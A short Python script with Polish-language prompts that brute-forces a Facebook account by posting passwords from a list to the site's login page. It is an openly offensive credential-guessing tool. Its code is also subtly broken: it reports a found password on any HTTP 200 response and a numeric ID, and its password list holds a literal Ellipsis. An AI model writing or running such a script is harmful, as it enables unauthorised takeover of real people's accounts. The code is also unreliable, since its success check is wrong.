import requests
import time
import re

def brute_force(username, password, fb_id):
    url = "https://www.facebook.com/login.php"
    payload = {
        "email": username,
        "password": password,
        "login": "Log In"
    }
    response = requests.post(url, data=payload)

    if response.status_code != 200:
        print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
        return False

    if not re.match(r'^[0-9]+$', fb_id):
        print("Nieprawidłowy identyfikator Facebook.")
        return False

    print("Znaleziono hasło:", password)
    return True

def main():
    username = input("Podaj nazwę użytkownika: ")
    fb_id = input("Podaj identyfikator Facebook: ")

    # Check if the username is a string
    if not isinstance(username, str):
        print("Niepoprawna nazwa użytkownika.")
        return

    # Check if the fb_id is a string
    if not isinstance(fb_id, str):
        print("Nieprawidłowy identyfikator Facebook.")
        return

    password_list = ["hasło1", "hasło2", "hasło3", ...]

    # Check each password in the list
    for password in password_list:
        if brute_force(username, password, fb_id):
            break

    else:
        print("Nie znaleziono hasła.")

if __name__ == "__main__":
    main()








